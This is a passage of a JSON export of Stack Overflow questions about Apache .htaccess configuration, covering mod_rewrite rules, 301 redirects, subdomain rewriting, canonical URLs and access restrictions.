solutions would be great!</p>\n\n<pre><code> RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /oro/\n RewriteCond %{HTTP_HOST} ^(www.)?mydomain.com$ [NC]\n RewriteRule ^/?oro/(.*)$ /$1 [L,R=301]\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12603366,"title":"Write an .htaccess","body":"<p>How can I write this with .htaccess:</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\nDocumentRoot C:\\AppServ\\www\\mysite\\public\nServerName my_ip or domain\n&lt;/VirtualHost&gt;\n\n&lt;Directory \"C:/AppServ/www/mysite/public\"&gt;\nOptions FollowSymLinks\nAllowOverride All\n&lt;/Directory&gt;\n</code></pre>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12604925,"title":"URL rewritting with subdomain structure in php","body":"<p>I am trying to create a URL like category.\\ArticleName</p>\n\n<p>This is what I have written in my .htaccess</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^(.*).msite.com/([a-zA-Z]+) [NC]\nRewriteRule (.*) $1/Html/HomePage.php?Category=%1&amp;name=%2 [NC,QSA]\n</code></pre>\n\n<p>I actaully tried </p>\n\n<pre><code> RewriteCond %{HTTP_HOST} ^(.*).msite.com$ [NC]\n RewriteRule (.*) $1/Html/HomePage.php?Category=%1 [NC,QSA]\n</code></pre>\n\n<p>It worked fine means wild-card subdomain etc are enabled.</p>\n\n<p>Please help.</p>\n\n<p>Thanks\nYatendra.</p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12599892,"title":".htaccess 301 redirect with variables","body":"<p>I'm upgrading a site which will use new links. It is possible to figure out the new URL from the old URL so I want to make a few 301 entries in the .htaccess to forward old links.</p>\n\n<p>I'm aware that this is possible</p>\n\n<pre><code>Redirect 301 /orginalURL.html http://website.com/newURL.php\n</code></pre>\n\n<p>However I need to use portions of the old url to construct the new url. Is this possible?\nExample old url</p>\n\n<pre><code>/index.php?page=/shop/bcat&amp;c=47\n</code></pre>\n\n<p>And that should instead be</p>\n\n<pre><code>/se/category/47\n</code></pre>\n\n<p>In this case 47 is the key that I need to get from the old URL to the new. Also I can't expect /index.php to exist in all old links so they might look like /?page=/shop/bcat&amp;c=47\nas well.</p>\n\n<p>Anyone who can help me here and I might be able to figure out the rest of the redirects myself :)</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12606470,"title":"Excluding images from mod_rewrite rule","body":"<p>Inadvertently my htaccess script is changing image URLs so that any image with \"portfolio/\" in its URL path is adversely affected.</p>\n\n<p>Is there any way to exclude images from that particular rule?</p>\n\n<pre><code>redirect 301 \"/sitemap.xml\" http://www.example.com/sitemap.php\n\nRewriteEngine On\n\nRewriteCond %{REQUEST_URI} !portfolio/project\nRewriteCond %{REQUEST_URI} /.*portfolio/.*$ [NC]\nRewriteRule ^(.*)portfolio(.*)$ /$1portfolio/project$2 [R=301,L]\n\nRewriteCond $1 !\\.(gif|jpe?g|png)$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^/sitemap.php\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n"},{"tags":[".htaccess","redirect","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12606759,"title":"Avoid HTTPS redirect to HTTP via htaccess","body":"<p>I have a passbook application Im trying to make work with https, because it doesnt work on http.  I thought I simply had to move the folder from httpdocs to httpsdocs, but I have to add some rules to htaccess.  </p>\n\n<p>My question is, what rule must I write?  I want to leave the website at mydomain.com under http.  I just want the application folder, <a href=\"http://mydomain.com/myapp/\" rel=\"nofollow\">http://mydomain.com/myapp/</a> to be redirected to <a href=\"https://mydomain.com/myapp\" rel=\"nofollow\">https://mydomain.com/myapp</a>.</p>\n\n<p>Lastly, im able to access my app by typing in <a href=\"https://mydomain.com/myapp/\" rel=\"nofollow\">https://mydomain.com/myapp/</a> which loads the index.html.  The problem is that its a form that posts to a form.php and then does a bunch of other things with folders inside the myapp folder.  So after I post to the form.php, I notice I get redirected back out to <a href=\"http://mydomain.com/myapp/\" rel=\"nofollow\">http://mydomain.com/myapp/</a> instead of the https version.</p>\n\n<p>So my rule would basically need to specify that everything pertaining to mydomain.com/myapp/ be run in the https folder and not the http.  Is this possible?  I thought of this:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^mydomain.com/myapp/ [NC]\nRewriteCond %{SERVER_PORT} 80\nRewriteRule ^(.*)$ https://www.mydomain.com/myapp/$1 [R,L]\n</code></pre>\n\n<p>but Im still getting redirected back out after posting the form.</p>\n"},{"tags":["php","apache",".htaccess","web-applications"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12603839,"title":"Limiting Access to a subdirectory, httpd.conf access is not allowed, don't want to create htaccess apart from root directory","body":"<p>I researched for this quite a long time, but could not find proper answer. \nI am using Free PHP Hosting website which is provided by <code>000webhost.com</code>. \nI have a <code>.htaccess</code> in public_html folder given by them. \ndirectory structure has sub-directory such as <code>includes</code> which I dont want the users to if they directly go to URL, It should say <code>Forbidden - 403</code>. </p>\n\n<p>I do not want <code>.htaccess</code> in every sub-directory where I do not want allow access. \nI read somewhere that .htaccess can change behavior of all the subdirectories and itself. </p>\n\n<p>I know performance wise it is not a good option, but I do not have access to httpd.conf. </p>\n\n<p>I think on SO there are some answers which tells me this :\n 1. move those subdirectories outsides the public_html (do not want to do that)\n 2. create <code>.htaccess</code> for every subdirectories and denying access (which is pain and not a scalable solution)\n 3. Use rewrite rules (Could be a solution not sure)\nI hope someone can understand and help me out. </p>\n\n<p>Thanks a lot. </p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","paypal-ipn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12603236,"title":"Redirect PayPal IPN URL","body":"<p>I had my script set up on <code>old.example.com/?paypal_notify=1</code>. There were a few people who signed up to my membership plan while the site was on the old URL. I then moved my site to <code>example.com</code> (no more subdomain) and updated my IPN URL in the PayPal settings. </p>\n\n<p>Unfortunately PayPal is still sending IPNs to the old URL for the members who signed up on the old URL. I tried to redirect the IPN with .htaccess from <code>old.example.com</code></p>\n\n<pre><code>Redirect /?paypal_notify=1 http://example.com/?paypal_notify=1\n</code></pre>\n\n<p>This isn't working - I think my redirect rule isn't right. Can someone give me a pointer please? Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12591826,"title":"Apache rewriterule with serendipity weblog does not work","body":"<p>I am using the serendipity weblog and want to make a rewriterule in an apache htaccess-file that when /info is being opened in the browser it opens /index.php?/categories/1-Info instead.</p>\n\n<p>I tried following rewriterule:</p>\n\n<pre><code>RewriteRule ^info index.php?/categories/2-Info [L]\n</code></pre>\n\n<p>and it does not work. When I change the substitution into something else (like <a href=\"http://www.google.com\" rel=\"nofollow\">http://www.google.com</a>) it does go there, so the pattern should work, but it doesn't show me the serendipity category that I want to see. The address does work though, when I enter it manually.</p>\n\n<p>I read a dozen webpages with guides and used \"http://martinmelin.se/rewrite-rule-tester/\" to verify my rewriterule, but I still cannot get it to work. Unfortunately I cannot see or set any logging either.</p>\n\n<p>How do I have to change the rewriterule?</p>\n\n<p>Edit:</p>\n\n<p>My .htaccess file looks like this:</p>\n\n<pre><code># BEGIN s9y\nErrorDocument 404 /data/script/index.php\nDirectoryIndex /data/script/index.php\nOptions -MultiViews\n\nRewriteEngine On\nRewriteBase /data/script/\nRewriteRule ^info index.php?/categories/2-Info [L]\n\n&lt;Files *.tpl.php&gt;\n    deny from all\n&lt;/Files&gt;\n\n&lt;Files *.tpl&gt;\n    deny from all\n&lt;/Files&gt;\n\n&lt;Files *.sql&gt;\n    deny from all\n&lt;/Files&gt;\n\n&lt;Files *.inc.php&gt;\n    deny from all\n&lt;/Files&gt;\n\n&lt;Files *.db&gt;\n    deny from all\n&lt;/Files&gt;\n\n# END s9y\n</code></pre>\n"},{"tags":["javascript","jquery",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12582421,"title":"Rewrite URL hash to get variable","body":"<p>I am working on a site that has dynamic content.</p>\n\n<p>When you click an article, it changes to address using the push state. </p>\n\n<p>Example:</p>\n\n<p><a href=\"http://www.some-site.com/news/\" rel=\"nofollow\">http://www.some-site.com/news/</a> - Before clicking a news item</p>\n\n<p><a href=\"http://www.some-site.com/news/dynamic-url/\" rel=\"nofollow\">http://www.some-site.com/news/dynamic-url/</a> - after clicking news item</p>\n\n<p>But as pushstate does not work in IE or older browsers, I've rewritten it to use jQuery.address so it changes the hash in the url instead only for IE.</p>\n\n<p>The problem now, is say someone sends a link to the site to a friend that they copied from Chrome and their friend uses IE, it will start appending the new has to that url.</p>\n\n<p>Example:</p>\n\n<p><a href=\"http://www.some-site.com/news/dynamic-url/\" rel=\"nofollow\">http://www.some-site.com/news/dynamic-url/</a> - URL sent to friend</p>\n\n<p><a href=\"http://www.some-site.com/news/dynamic-url/#!/dynamic-url\" rel=\"nofollow\">http://www.some-site.com/news/dynamic-url/#!/dynamic-url</a> -  URL after friend visits the site</p>\n\n<p>So, I'm stuck on how to rewrite/redirect them. As, the hash never gets sent to Apache. \nI've seen on twitter, they do exactly what I want, but I am unable to figure out how.</p>\n\n<p><a href=\"https://twitter.com/#!/google\" rel=\"nofollow\">https://twitter.com/#!/google</a> gets redirected to <a href=\"https://twitter.com/google\" rel=\"nofollow\">https://twitter.com/google</a> and it works in IE.</p>\n\n<p>Any help is much appreciated and if you don't understand please ask me to elaborate.</p>\n\n<p>As suggested by David Thomas, here is the function.</p>\n\n<pre><code>var permalink = function(title, id, permalink){\n    var current = siteUrl + type + (order ? '/orderBy/' + order : '');\n    var newUrl = current + '/' + permalink + '/';\n    if(jQuery.browser.msie){\n        newUrl = '/' + permalink + '/';\n        jQuery.address.value(newUrl);\n    }\n    else{\n        stateNum++;\n        window.history.pushState({state: stateNum}, title, newUrl);\n    }\n    jQuery('title').html('SITE - ' + title);\n}\n</code></pre>\n"},{"tags":["php","html",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":12599601,"title":"Directory-specific issues for htaccess","body":"<p>I have a site, which has the following folders</p>\n\n<p>testing1\nand its subfolders:</p>\n\n<p>myfolder</p>\n\n<p>myfolder2</p>\n\n<p>myfolder3</p>\n\n<p>This is the .htaccess file for it:</p>\n\n<pre><code>   AddType application/x-httpd-php .html .htm\n   php_value auto_append_file testing1.php\n</code></pre>\n\n<p>This works for the main directory, but how can I make changes from a single .htaccess file without having to place one in every directory (I use cPanel and copy-and-paste them across for now).</p>\n\n<p>The directory myfolder2 contains a multi-page flipbook (converted from PDF) created in AXMAG, a flipbook software (can't post links yet - but look it up on Google). I want to leave the files intact, but at the sametime append the site notice to them which is:</p>\n\n<pre><code>© My company here 2012. Content copyrighted\n</code></pre>\n\n<p>How can I do per-directory .htaccess for autoappend, and add-type html .htm.</p>\n\n<p>BTW, myfolder2 went blank on the HTML page when I put the .htaccess in - what am I doing wrong? No issues for the other directories though.</p>\n\n<p>I would appreciate any help with this, although I can do htaccess there's some bits of it I'm still new to.</p>\n"},{"tags":[".htaccess","mod-rewrite","hyperlink","rewrite","subfolder"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12574171,"title":"htaccess not working for subfolders","body":"<p>i want to ask why my .htaccess in root folder does not work well.</p>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine On \nRewriteRule ^([a-zA-Z0-9]+)(/[a-zA-Z0-9/]+)?$ /$1\\.php$2 [L]\n\nRewriteCond %{THE_REQUEST} ^GET\\s/*pages/.*\\.php [NC] \nRewriteRule ^([a-zA-Z0-9]+)(/[a-zA-Z0-9/]+)?$ /$1\\.php$2 [L]\n\nRewriteCond %{THE_REQUEST} ^GET\\s/*debates/.*\\.php [NC]\nRewriteRule ^([a-zA-Z0-9]+)(/[a-zA-Z0-9/]+)?$ /$1\\.php$2 [L]\n</code></pre>\n\n<p>Links in the / (main folder) are with working .php hidding, but in the subfolders like /pages/ and /debates/ the system does not recognize rewrite rule. I want to hide .php in both directories like they are hidden in the main folder.</p>\n\n<p>I FIND THE SOLUTION!</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^(.+)$ $1.php [L,QSA]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12250769,"title":"adding exception in .htaccess","body":"<p>My current .htaccess code is as follows:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymLinks\n  RewriteEngine On\n\n  # Get rid of index.php\n  RewriteCond %{REQUEST_URI} /index\\.php\n  RewriteRule (.*) index.php?rewrite=2 [L,QSA]\n\n  # Rewrite all directory-looking urls\n  RewriteCond %{REQUEST_URI} /$\n  RewriteRule (.*) index.php?rewrite=1 [L,QSA]\n\n  # Try to route missing files\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} public\\/ [OR]\n  RewriteCond %{REQUEST_FILENAME} \\.(jpg|gif|png|ico|flv|htm|html|php|css|js)$\n  RewriteRule . - [L]\n\n  # If the file doesn't exist, rewrite to index\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^(.*)$ index.php?rewrite=1 [L,QSA]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>sends </p>\n\n<pre><code>requests /index.php/path/to/module/ to \"index.php\"\n AcceptPathInfo On\n</code></pre>\n\n<p>@<code>todo</code> This may not be effective in some cases</p>\n\n<pre><code>FileETag Size\n</code></pre>\n\n<p>Now, I want to integrate a script with this htaccess...  Here is what the script says...\"add <code>exception</code> to execute all the index.php files inside the /cometchat directory and its sub-directories on your server.\"</p>\n\n<p>So, how can I add the exception to execute the <code>Index.php</code> from this directory, at the same time do not hamper the existing <code>.htaccess code</code>...</p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12598630,"title":"Codeigniter 2.1 and .htaccess - rewrite url","body":"<p>I need to rewrite this url:</p>\n\n<blockquote>\n  <p>domain.com/mali_oglasi/index/1(any number)</p>\n</blockquote>\n\n<p>to:</p>\n\n<blockquote>\n  <p>domain.com/mali_oglasi</p>\n</blockquote>\n\n<p>In my .htaccess file I have this code:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n</code></pre>\n\n<p>How can I do this?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":12166558,"title":".htaccess files possibly conflicting?","body":"<p>I have one .htaccess file in the public_html folder of my server that lets me keep my primary domain in a subfolder:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^(www.)?mrmikeanderson.com$\nRewriteCond %{REQUEST_URI} !^/mrmikeanderson/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /mrmikeanderson/$1\nRewriteCond %{HTTP_HOST} ^(www.)?mrmikeanderson.com$\nRewriteRule ^(/)?$ mrmikeanderson/index.php [L]        \n</code></pre>\n\n<p>In that subfolder is another .htaccess with more rewrites to turn urls ending with things like /index.php?page=about into just /about:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^$ index.php?page=home\nRewriteRule portfolio index.php?page=portfolio\nRewriteRule resume index.php?page=resume\nRewriteRule about index.php?page=about\nRewriteRule contact index.php?page=contact\n</code></pre>\n\n<p>The last four pages work, but my rewrite for just the domain name (\\^$) is broken. Everything works on my local MAMP server, but the first .htaccess file is not present there, so I'm thinking that the two are conflicting. Any web dev champs able to see what's going wrong?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":49,"score":0,"question_id":12599785,"title":"Can't turn on the rewrite engine","body":"<p>I have encountered a problem, while implementing MVC design patterns for my website. I have a folder named <em>\"svce\"</em> inside the folder <code>/www</code> (which is my <code>DOCUMENT_ROOT</code>). I created a <code>.htaccess</code> file and wrote the following codes inside it:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule ^(.+)$index.php?url=$1 [QSA,L]\n</code></pre>\n\n<p>Then I edited the <code>httpd.conf</code> file and uncommented the <code>LoadModule rewrite_module modules/mod_rewrite.so</code>. </p>\n\n<p>Even after doing this, <code>RewriteEngine</code> is not working. When I try to access application using <code>http://localhost/svce/blahblah.php</code>, it gives me a default 404 error page.</p>\n\n<p>IT should have shown me only the index page inside the <code>/svce</code> directory.</p>\n"},{"tags":["wordpress","apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12594577,"title":"Redirect Main Site to Subsite in Multisite Wordpress","body":"<p>I have multi-site wordpress, I want to redirect the main site to one of the sub-site but redirection in .htacecss gives error. Is there any way to redirect a main site to its sub-site. That looks not possible but I am not a wordpress expert so just verifying.</p>\n\n<p>The redirect should be like</p>\n\n<p>redirect 301 <a href=\"http://www.example.com/main-site%20www.example.com/main-site/sub-site\" rel=\"nofollow\">link</a></p>\n\n<p>Or if there is any other way to do that?</p>\n"},{"tags":["wordpress","apache",".htaccess","url","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12598802,"title":"How to remove ? from the url using htaccess","body":"<p>I having a URL <a href=\"http://www.domain.com/postname/?a_different_world\" rel=\"nofollow\">http://www.domain.com/postname/?a_different_world</a></p>\n\n<p>I need to change it to <a href=\"http://www.domain.com/postname/a_different_world\" rel=\"nofollow\">http://www.domain.com/postname/a_different_world</a></p>\n\n<p>How to remove ?  from the URL using Htacccess(Wordpress)</p>\n\n<p>I use following htaccess code. But it is not working</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php-$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /domain.com/index.php [L]\nRewriteRule ^/postname/([0-9]+)$ /? $1 [L,QSA] \n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","xampp","lamp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12597310,"title":"If/else and file_exists function in htaccess mod_rewrite","body":"<p>I don't really know how to explain this situation but i give it a try. So, I have this url: \n<strong>http://localhost/static/some_picture.png</strong>, and my folders look something like this:</p>\n\n<ul>\n<li>statics/x/picture.png</li>\n<li>statics/y/logo.png</li>\n</ul>\n\n<p>What I want is that if the user types the mentioned url, he will see the \"picture.png\" what is in the \"statics/x/picture.png\", but if he types <strong>http://localhost/static/some_logo.png</strong> then he will see the \"logo.png\" in the \"statics/y/logo.png\".</p>\n\n<p>My last try:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond statics/x/$1 -f\nRewriteRule ^static/some_(.*)$ statics/x/$1  [L]\n\nRewriteEngine On\nRewriteCond statics/y/$1 -f\nRewriteRule ^static/some_(.*)$ statics/y/$1  [L]\n</code></pre>\n\n<p>Currently i have this .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule %{REQUEST_FILENAME} ^static/some_(.*)$\nRewriteCond %{DOCUMENT_ROOT}/statics/x/%1 -f\nRewriteRule ^static/some_(.*)$ statics/x/$1  [L]\n\nRewriteEngine On\nRewriteRule %{REQUEST_FILENAME} ^static/some_(.*)$\nRewriteCond %{DOCUMENT_ROOT}/statics/y/%1 -f\nRewriteRule ^static/some_(.*)$ statics/y/$1  [L]\n\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [QSA,L]\n&lt;/IfModule&gt; \n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12597650,"title":"htaccess rewrite rule with length of request","body":"<p>I currently have the code </p>\n\n<pre><code>RewriteRule ^(.+)$  index.php\n</code></pre>\n\n<p>which will redirect all the request to the index.php</p>\n\n<p>I want to check if the request have 16 character then want to redirect to <code>index.php?param=ABCDEFGHJK123456</code></p>\n\n<p>If length of request is not 16 character the just <code>index.php</code></p>\n"},{"tags":[".htaccess","url","seo","duplicates","canonicalization"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":67,"score":3,"question_id":12574347,"title":"Is it possible with canonical URL for this pattern in htaccess: /a/*/id/uniqueid?","body":"<p>A big problem is that I am not a programmer….! So I need to solve this with means within my own competence… I would be very happy for help!</p>\n\n<p>I have an issue with a lot of duplicated URLs in the Google index and there are strong signs that it is causing SEO problems.</p>\n\n<p>I don’t have duplicate links on the site itself, but as it once was set-up, for certain pages the system allows all sorts of variations in the URL. As long as is it has a specific article-id, the same content will be presented under an infinite number of URLs.</p>\n\n<p>I guess the duplicates in Googles index has been growing over long time and is due to links gone wrong from other sites that links to mine. The problem is that the system have accepted the variations.</p>\n\n<p>Here are examples of variations that exists in the Google index:</p>\n\n<ul>\n<li>site.com/a/Cow_Cat/id/5272</li>\n<li>site.com/a/cow_cat/id/5272</li>\n<li>site.com/a/cow…cat/id/5272 </li>\n<li>site.com/a/cowcat/id/5272</li>\n<li>site.com/a/bird/id/5272</li>\n</ul>\n\n<p>The first URL with mixed case is the one used site-wide and for now I have to live with it, it would take too long time to make a change to all lower case. I cannot make a manual effort via htaccess as it is a total of 300.000 articles. I believe there are 10 ‘s of thousands that have one or more duplicates.</p>\n\n<p>My question is this:</p>\n\n<p>Is it possible to create rules for  canonical URLs in htaccess in order to make the above URLs to be handled as one as well as for the rest of the 300.000?</p>\n\n<p>I e, is there a way to say that all URLs having </p>\n\n<p>/a/*/id/uniqueid</p>\n\n<p>should be seen as one = based only on the unique ID and not give any regard to the text expressed with the “*”?</p>\n\n<p>My hope is that it would be possible to say that a certain pattern like above should only be differentiated by the last unique segment.</p>\n\n<p>If it is not possible in htaccess, how would it be done with link rel=\"canonical\" on each page, can the code include wildcards?</p>\n\n<p>I should add that the majority of the duplicates are caused by incoming links being lower case where the site itself is using a mix. Would it be OK to assign a canonical URL only with lower case although the site itself is basically always using a mix of lower/upper case?</p>\n\n<p>If this is possible, I would be very happy to be helped with how to do it!!!!</p>\n\n<p>Jonas</p>\n\n<hr>\n\n<p>Hi Michael! I am not an expert but this is how I think it could be done: </p>\n\n<p>1) My problem is that the URLs have mixed cases and I cannot change that now. </p>\n\n<p>2) If it is OK for the searchengines, it would be fine for me to make the canonical URL identical to the actual URLs with the difference that it was all lower case, that would solve approx 90% of the duplicates. I e this would be the used URL: site.com/a/Cow_Cat/id/5272 and this would be the canonical: site.com/a/cow_cat/id/5272. As I understand, that would be good SEO...or...?</p>\n\n<p>My idea was NOT to change the address browser address bar (i e using 301 redirect) but rather just telling the search engines which URLs that are duplicates, as I understand, that can be done by defining a canonical URL either in htaccess (as a pattern - I hope) or as a tag on each page.</p>\n\n<p>3) IF, it would be possible to find a wildcard solution...I am not sure if this is possible at all, but that would mean it was possible to NOT assign a specific canonical URL but rather a \"group pattern\", i e \"Please search engine, see all URLs with this patter - having the unique identifier in the end - as if they are one and the same URL, you SE, decide which one you prefer\": /a/*/id/uniqueid</p>\n\n<p>Would that work? It will only work in htaccess if canonical URLs can be defined as a group where the group is defined as a pattern with a defined part as the unique id. </p>\n\n<p>Is it possible when adding a tag for each page to say that \"all URLs containing this unique id should be treated the same\"? If that would work it would look something similar to this </p>\n\n<p>link rel=\"canonical\" /a/*/id/5272</p>\n\n<p>I dont know if this syntax with wildcard exist but it would be nice : )</p>\n\n<p>JOnas</p>\n"},{"tags":["php",".htaccess","yii","http-status-code-403"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12593378,"title":"access denied 403 redirect","body":"<p>I have an image folder with all the user profile pics in the webroot.<br>\nNow I want to protect it with an htaccess file and options-indexes.<br>\nIt works fine, but I want yii to redirect the user to my special forbidden view instead of showing this ugly 403 access denied apache site.</p>\n\n<p>I tried the following code in my <code>actionError</code>() in the Site Controller, but doesn't work.</p>\n\n<pre><code> if (Yii::app()-&gt;errorHandler-&gt;error['code'] == 403)\n        $this-&gt;redirect(Yii::app()-&gt;homeUrl);\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","mod-alias"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11452650,"title":"Redirect (301) single page without mod_alias?","body":"<p>How to create pernament redirect (301) for single page in .htaccess without mod_alias ?</p>\n\n<p>f.e.</p>\n\n<p><a href=\"http://www.example.com/oldpage\" rel=\"nofollow\">http://www.example.com/oldpage</a>  --> <a href=\"http://www.elpmaxe.com/newpage\" rel=\"nofollow\">http://www.elpmaxe.com/newpage</a></p>\n"},{"tags":["apache",".htaccess","pdf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":6661096,"title":"Problem with opening pdf file in site","body":"<p>I have pdf file in serwer and link to it. In local host when i click on link pdf file display in site. On server I've got popup with asking to download file. How to change type from application/octet-stream to application/pdf to display pdf normal on site?\nHere is screen after clicking on link:</p>\n\n<p><img src=\"http://i.stack.imgur.com/g5za9.png\" alt=\"enter image description here\"></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":12594477,"title":"Issue changing a word in a URL using mod_rewrite","body":"<p>I'm trying to change the word \"portfolio\" in my URLs to \"portfolio/project\" and inadvertently created a redirect loop. Would appreciate any help in pointing me in the right direction.</p>\n\n<p>Example:</p>\n\n<p><a href=\"http://www.example.com/portfolio/interactive/abc/\" rel=\"nofollow\">http://www.example.com/portfolio/interactive/abc/</a> to </p>\n\n<p><a href=\"http://www.example.com/portfolio/project/interactive/abc/\" rel=\"nofollow\">http://www.example.com/portfolio/project/interactive/abc/</a></p>\n\n<p>Current htaccess (last two lines relates to issue):</p>\n\n<pre><code>redirect 301 \"/sitemap.xml\" http://www.example.com/sitemap.php\n\nRewriteEngine On\nRewriteCond $1 !\\.(gif|jpe?g|png)$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^/sitemap.php\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\nRewriteCond %{REQUEST_URI} /.*portfolio.*$ [NC]\nRewriteRule ^(.*)portfolio(.*)$ /$1portfolio/project$2 [R=301,L]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","rewrite","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12593860,"title":"URL rewriting a subdomain","body":"<p>Here is my question:</p>\n\n<p>I am wanting to redirect users from one subdomain while serving files from the previous. For example, I want a user to access their account:</p>\n\n<ul>\n<li>Files are located at: <code>holonet.example.com/account/</code></li>\n<li>I want the user's url to point to (display): <code>account.example.com/</code></li>\n</ul>\n\n<p>Another example:</p>\n\n<ul>\n<li>Files are: <code>holonet.example.com/account/user/reset</code></li>\n<li>URL point (display): <code>account.example.com/user/reset</code></li>\n</ul>\n\n<hr>\n\n<p>I have been trying a couple of .htaccess ways but they have not been working. Here is my latest attempts: (.htaccess in publc_html):</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^(holonet\\.)?thearmyoflight\\.com$ [NC]\nRewriteRule ^(.*)$ /account/$1 [L]\n</code></pre>\n\n<p>I then tried the following since the previous did not work -</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/holonet/account/\nRewriteCond %{HTTP_HOST} !^www\\.  [NC]\nRewriteCond %{HTTP_HOST} ^([^\\.]+)\\.thearmyoflight\\.com$  [NC]\nRewriteRule ^(.*)$ /holonet/account/%1/$1  [L]\n</code></pre>\n"},{"tags":["php","apache",".htaccess","laravel"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":12551191,"title":"Laravel show folder-content instead of site-content","body":"<p>Coming from CodeIgniter, I'd like to learn 